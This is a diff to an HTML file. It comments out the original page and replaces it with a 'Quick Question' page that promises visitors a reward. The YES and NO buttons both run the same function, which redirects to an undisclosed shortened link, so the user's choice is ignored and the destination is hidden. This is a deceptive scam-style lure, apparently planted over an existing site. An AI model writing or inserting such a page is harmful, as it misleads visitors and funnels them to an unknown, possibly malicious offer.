@@ -1,4 +1,4 @@
-
+<!--
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -266,6 +266,111 @@ clearInterval(timer)
 
 },1000)
 
+</script>
+
+</body>
+</html>
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Quick Question</title>
+
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial,sans-serif;
+}
+
+body{
+background:#0f172a;
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+padding:20px;
+color:white;
+}
+
+.box{
+background:#111827;
+width:100%;
+max-width:400px;
+padding:35px 25px;
+border-radius:20px;
+text-align:center;
+box-shadow:0 10px 30px rgba(0,0,0,0.4);
+}
+
+h1{
+font-size:28px;
+margin-bottom:15px;
+}
+
+p{
+font-size:16px;
+color:#cbd5e1;
+margin-bottom:30px;
+line-height:1.5;
+}
+
+.btns{
+display:flex;
+gap:15px;
+}
+
+button{
+flex:1;
+padding:15px;
+border:none;
+border-radius:12px;
+font-size:17px;
+font-weight:bold;
+cursor:pointer;
+transition:0.3s;
+}
+
+.yes{
+background:#22c55e;
+color:#000;
+}
+
+.no{
+background:#ef4444;
+color:#fff;
+}
+
+button:hover{
+transform:scale(1.03);
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+
+<h1>Quick Question</h1>
+
+<p>
+Would you like to answer a few simple questions and receive a reward today?
+</p>
+
+<div class="btns">
+<button class="yes" onclick="goOffer()">YES</button>
+<button class="no" onclick="goOffer()">NO</button>
+</div>
+
+</div>
+
+<script>
+function goOffer(){
+window.location.href="https://ln.run/comy";
+}
 </script>
 
 </body>
